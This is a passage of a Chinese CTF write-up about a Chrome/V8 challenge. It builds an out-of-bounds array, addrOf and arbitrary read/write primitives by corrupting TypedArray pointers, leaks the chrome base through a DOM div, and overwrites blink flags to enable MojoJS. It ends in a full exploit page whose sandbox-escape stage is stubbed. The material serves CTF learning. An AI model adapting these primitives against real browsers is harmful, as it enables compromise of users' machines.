<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR/AAW"></a>AAR/AAW</h5><p>大多数情况下，可以利用 oob_arr 的越界写，改写 ArrayBuffer 的 backing_store 指针，来进行任意地址读写</p>
<p>不过这里参照 Hatena 师傅的 wp <a href="#Hatena_wp">#Hatena_wp</a>，可以利用 TypedArray 类似的字段进行任意地址读写，先看看下面代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，data_ptr 由 base_pointer 和 external_pointer 组成：<br><img src="/images/68622871/9.png" alt="TypedArray_data_ptr"></p>
<p>可以发现 <strong>data_ptr = external_pointer + base_pointer</strong>，而且这个 external_pointer 含有完整指针的高 4 字节的地址，有了这个也可以得到对象的完整的 64 bit 的地址了<br><img src="/images/68622871/10.png" alt="data_ptr_mem"></p>
<p>同样地计算偏移后即可构造处任意地址读写：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
<span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
<span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h5 id="Enable-Mojo"><a href="#Enable-Mojo" class="headerlink" title="Enable Mojo"></a>Enable Mojo</h5><p>有了任意地址读写和 leak 用的 addrOf，可以先泄露 chrome 的基地址</p>
<p>泄露 chrome 的基地址用到了 DOM 结点对象，这里使用 div ，在 +0xC 偏移处含有一个 chrome 段内的指针，计算可得 chrome 的地址：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的偏移，只能先 leak 出来看看，然后查符号表看看低 12 bits 相同的有哪些一个个试了 </p>
<p>最后改写 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code> 为 true（非 0 值）刷新页面：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


<span class="token comment">// enable mojo</span>
<span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>偏移可以通过查符号表获得：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nm --demangle chromium/chrome <span class="token operator">|</span> <span class="token function">grep</span> is_mojo
000000000c560f0e b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
000000000c560f0f b blink::RuntimeEnabledFeaturesBase::is_mojo_js_test_enabled_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因为刷新页面后，这个页面的 js 对象就要回收了，因为我们改写了 TypedArray 的两个指针，可能会在释放内存的时候 crash，所以需要恢复这两个指针再刷新：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> old_28<span class="token punctuation">;</span>
    oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> old_29<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><em>实际上好像并不会 crash，应该和环境有关</em></p>
<hr>
<p>至此，完整的代码如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"mojo/mojo_bindings.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'oob_arr.length = '</span> <span class="token operator">+</span> oob_arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
    <span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
    <span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
    <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
        <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


    <span class="token comment">// enable mojo</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>Mojo<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"enabling mojo ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sandbox escape ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">await</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
